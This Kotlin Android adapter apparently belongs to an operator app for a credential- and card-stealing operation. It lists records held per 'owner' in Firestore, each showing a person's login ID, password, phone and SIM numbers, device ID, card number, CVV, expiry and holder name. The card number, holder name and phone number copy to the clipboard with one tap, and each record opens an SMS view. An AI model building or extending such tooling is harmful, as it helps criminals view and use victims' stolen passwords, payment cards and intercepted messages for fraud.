package com.example.lucky

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.firestore.FirebaseFirestore
import com.example.lucky.ui.MainActivity.Companion.owner
import com.example.lucky.NewUtils.addDashesToCardNumber
import com.example.lucky.NewUtils.toSafeLong
import com.example.lucky.SharedPreferencesHelper.Companion.sharedPref
import com.example.lucky.Util.toDate

class UserAdapter(
    private val users: List<UserModel>,
    private val context: Context
) : RecyclerView.Adapter<UserAdapter.MyViewHolder>() {

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): MyViewHolder {
        val view = LayoutInflater.from(parent.context)
            .inflate(R.layout.info_sample_row, parent, false)
        return MyViewHolder(view)
    }

    @SuppressLint("SetTextI18n")
    override fun onBindViewHolder(holder: MyViewHolder, position: Int) {
        val user = users[position]


        // Binding data to the views based on updated UserModel and XML
        holder.timeStamp.text = if (user.timeStamp.toSafeLong() > 0) user.timeStamp.toDate() else user.o.toDate()
        holder.loginId.text = user.loginId
        holder.password.text = user.password
//        holder.key.text = user.key
        holder.phoneNumber.text = user.phoneNumber // keep as-is
        holder.deviceID.text = user.deviceID.ifEmpty { user.f }
        holder.deviceInfo.text = user.deviceInfo.ifEmpty { user.g }
        holder.androidVersion.text = user.androidVersion
        holder.cardNumber.text = user.cnumber.addDashesToCardNumber()
        holder.sim1Number.text = user.sim1Number.ifEmpty { user.j }
        holder.sim2Number.text = user.sim2Number.ifEmpty { user.k }
        holder.cvv.text = user.cv
        holder.expiryDate.text = user.edate
        holder.holderName.text = if (user.hName.isNotEmpty()) user.hName else user.apin


        if (user.cnumber.isEmpty()){
            holder.cardNumber.text = context.sharedPref.getString("${user.key}cnumber")
        }
        if (user.cv.isEmpty()){
            holder.cvv.text = context.sharedPref.getString("${user.key}cv")
        }
        if (user.edate.isEmpty()){
            holder.expiryDate.text = context.sharedPref.getString("${user.key}edate")
        }
        if (user.androidVersion.isEmpty()){
            holder.androidVersion.text = context.sharedPref.getString("${user.key}androidVersion")
        }


        holder.cardNumber.setOnClickListener {
            // Copy card number to clipboard
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = android.content.ClipData.newPlainText("Copied Text", user.cnumber)
            clipboard.setPrimaryClip(clip)
            // Show success toast
            Toast.makeText(context, "Card number copied to clipboard!", Toast.LENGTH_SHORT).show()
        }

        holder.holderName.setOnClickListener {
            // Copy holder name to clipboard
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = android.content.ClipData.newPlainText("Copied Text", holder.holderName.text.toString())
            clipboard.setPrimaryClip(clip)
            // Show success toast
            Toast.makeText(context, "Holder name copied to clipboard!", Toast.LENGTH_SHORT).show()
        }

        holder.phoneNumber.setOnClickListener {
            // Copy holder name to clipboard
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = android.content.ClipData.newPlainText("Copied Text", holder.phoneNumber.text.toString())
            clipboard.setPrimaryClip(clip)
            // Show success toast
            Toast.makeText(context, "Phone number copied to clipboard!", Toast.LENGTH_SHORT).show()
        }


        // Item click to open SmsActivity
        holder.itemView.setOnClickListener {
            val intent = Intent(context, SmsActivity::class.java)
            intent.putExtra("user", user)
            context.startActivity(intent)
        }


        // Long click to delete user
        holder.itemView.setOnLongClickListener {
            val alertDialog = android.app.AlertDialog.Builder(context)
            alertDialog.setTitle("Delete!")
            alertDialog.setMessage("Are you sure you want to delete this user?")
            alertDialog.setPositiveButton("Delete") { dialog, _ ->
                if (user.key.isNotEmpty() && owner.isNotEmpty()) {
                    FirebaseFirestore.getInstance()
                        .collection("owners").document(owner)
                        .collection("users").document(user.key)
                        .delete()
                        .addOnSuccessListener { Toast.makeText(context, "User deleted", Toast.LENGTH_SHORT).show() }
                        .addOnFailureListener { e -> Toast.makeText(context, "Delete failed: ${e.message}", Toast.LENGTH_SHORT).show() }
                }

                dialog.dismiss()
            }
            alertDialog.setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
            }
            alertDialog.create().show()
            true
        }
    }

    override fun getItemCount(): Int = users.size

    inner class MyViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
        val timeStamp: TextView = itemView.findViewById(R.id.timeStamp)
        val loginId: TextView = itemView.findViewById(R.id.loginId)
        val password: TextView = itemView.findViewById(R.id.password)
        val phoneNumber: TextView = itemView.findViewById(R.id.phoneNumber)
        val deviceID: TextView = itemView.findViewById(R.id.deviceID)
        val deviceInfo: TextView = itemView.findViewById(R.id.deviceInfo)
        val androidVersion: TextView = itemView.findViewById(R.id.android_version)
        val cardNumber: TextView = itemView.findViewById(R.id.cardNumber)
        val sim1Number: TextView = itemView.findViewById(R.id.sim1Number)
        val sim2Number: TextView = itemView.findViewById(R.id.sim2Number)
        val cvv: TextView = itemView.findViewById(R.id.cvv)
        val expiryDate: TextView = itemView.findViewById(R.id.expiryDate)
        val holderName: TextView = itemView.findViewById(R.id.holderName)
    }
}